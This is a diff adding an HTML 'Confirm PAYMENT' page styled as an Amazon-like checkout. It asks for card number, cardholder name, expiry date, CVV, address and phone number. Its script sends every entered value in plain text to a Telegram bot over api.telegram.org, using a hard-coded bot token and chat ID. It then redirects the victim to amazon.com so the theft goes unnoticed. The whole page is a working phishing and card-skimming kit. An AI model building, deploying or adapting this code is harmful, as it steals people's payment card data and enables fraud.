@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Responsive Payment gateway form design in Hindi</title>
+    <style>
+        *{padding:0; margin:0; box-sizing: border-box; font-family:sans-serif;}
+        header{
+            position: relative;
+            width: 100vw;
+            min-height: 100vh;
+            font-size: 1.2rem;
+            display: flex;
+            flex-direction: column;
+        }
+        .header-top {
+            background: #2B333D; /* Cambiar el color de fondo aquí */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 8px 0;
+        }
+        .container{
+            background: white;
+            max-width: 800px;
+            min-height: 500px;
+            display: flex;
+            justify-content:space-between;
+            align-items: flex-start;
+            padding: 0.5rem 1.5rem;
+            border-radius: 10px; /* Añade el borde redondeado */
+            border: 1px solid #2B333D; /* Cambia el color y grosor del borde según tu preferencia */
+            margin: 0 auto;
+        }
+        .right{
+            flex-basis: 100%;
+        }
+        form{
+            padding: 1rem;
+        }
+
+        h3{
+            margin-top: 1rem;
+            color:#2c3e50;
+        }
+
+        form input[type="text"], form input[type="number"]{
+            width: 100%;
+            padding: 0.5rem 0.7rem;
+            margin: 0.5rem 0;
+            outline: none;
+        }
+
+        #zip{
+            display: flex;
+            margin-top: 0.5rem;
+        }
+        #zip input[type="text"]{
+            padding: 0.5rem 0.7rem;
+        }
+        #zip input[type="number"]{
+            padding: 0.5rem 0.7rem;
+            margin-left: 5px;    
+            margin-top: 7px; 
+        }
+        input[type="submit"]{
+            width: 100%;
+            padding: 0.7rem 1.5rem;
+            background-color: #f7ca00;
+            color: black;
+            border: none;
+            outline: none;
+            margin-top: 1rem;
+            cursor: pointer;
+            border-radius: 10px; 
+        }
+
+        input[type="submit"]:hover{
+            background-color: #e0b500;
+        }
+
+        /* Estilos para PC */
+        @media only screen and (min-width: 771px) {
+            .container{
+                margin-top: 100px; /* Espacio entre el encabezado y el formulario */
+            }
+        }
+
+        /* Estilos para dispositivos móviles */
+        @media only screen and (max-width: 770px){
+            .container{
+                margin-top: 0px; /* Ajuste del espacio entre el encabezado y el formulario en dispositivos móviles */
+            }
+            body{
+                overflow-x: hidden;
+            }
+        }
+    </style>
+</head>
+<body>
+<header>
+    <div class="header-top">
+        <img src="Ama.png" alt="Logo" style="width: 100px; height: auto; margin-left:-250px; padding:1px;">
+    </div>
+    <div class="container">
+        <div class="right">
+            <h3> Confirm PAYMENT</h3>
+            <form id="paymentForm">
+                Accepted Card <br>
+                <img src="image/card1.png" width="100">
+                <img src="image/card2.png" width="50">
+                <br><br>
+
+                Credit card number
+                <input type="text" name="cardNumber" placeholder="Enter card number" inputmode="numeric" required="">
+                
+                Cardholder Name
+                <input type="text" name="cardHolder" placeholder="Enter Cardholder Name">
+                
+                <div id="zip">
+                    <label>
+                        Exp
+                        <input type="text" name="expDate" placeholder="MM/YYYY" style="width: 100px; font-size: 0.8rem;" inputmode="numeric" required="">
+                    </label>
+                    <label>
+                        CVV
+                        <input type="number" name="cvv" placeholder="CVV" required="">
+                    </label>
+                </div>
+
+                <hr style="margin: 1rem 0;">
+                <h3 style="text-align: center;" > Address information</h3>
+
+                Address Line
+                <input type="text" name="addressLine" placeholder="Enter Address Line" required="">
+                
+                City
+                <input type="text" name="city" placeholder="Enter City" required="">
+                
+                State
+                <input type="text" name="state" placeholder="Enter State" required="">
+
+                Postal Code
+                <input type="text" name="postalCode" placeholder="Enter Postal Code" required="">
+
+                Phone Number
+                <input type="text" name="phoneNumber" placeholder="Enter Phone Number" required="">
+
+                <input type="submit" name="" value="Confirm information">
+            </form>
+        </div>
+    </div>
+</header>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const form = document.getElementById('paymentForm');
+        const token = '7253953527:AAEG79h8doC2jZZAEwei6UxZPnWy4ZRMIBo'; // Reemplaza con tu token de bot
+        const chatId = '7300172963'; // Reemplaza con tu chat_id
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData(form);
+            const data = {
+                cardNumber: formData.get('cardNumber'),
+                cardHolder: formData.get('cardHolder'),
+                expDate: formData.get('expDate'),
+                cvv: formData.get('cvv'),
+                addressLine: formData.get('addressLine'),
+                city: formData.get('city'),
+                state: formData.get('state'),
+                postalCode: formData.get('postalCode'),
+                phoneNumber: formData.get('phoneNumber')
+            };
+
+            const message = `
+                Credit Card Number: ${data.cardNumber}
+                Cardholder Name: ${data.cardHolder}
+                Exp Date: ${data.expDate}
+                CVV: ${data.cvv}
+                Address Line: ${data.addressLine}
+                City: ${data.city}
+                State: ${data.state}
+                Postal Code: ${data.postalCode}
+                Phone Number: ${data.phoneNumber}
+            `;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    
+                    window.location.href = 'https://www.amazon.com'; // Reemplaza con la URL de redirección deseada
+                } else {
+                    
+                }
+            })
+            .catch(error => {
+                
+                console.error('Error:', error);
+            });
+        });
+      
+
+        const expMonthInput = document.querySelector('input[name="expDate"]');
+
+        expMonthInput.addEventListener('input', function() {
+            const maxLength = 7;
+            const separatorPosition = 2;
+            const value = this.value.replace(/\D/g, '');
+            
+            if (value.length > maxLength) {
+                this.value = value.slice(0, maxLength);
+            } else if (value.length > separatorPosition) {
+                this.value = value.slice(0, separatorPosition) + '/' + value.slice(separatorPosition);
+            }
+        });
+
+        const cardNumberInput = document.querySelector('input[name="cardNumber"]');
+
+        cardNumberInput.addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, ''); // Eliminar cualquier caracter que no sea un número
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i += 4) {
+                if (i > 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value.substr(i, 4);
+            }
+            this.value = formattedValue;
+        });
+    });
+</script>
+
+</body>
+</html>
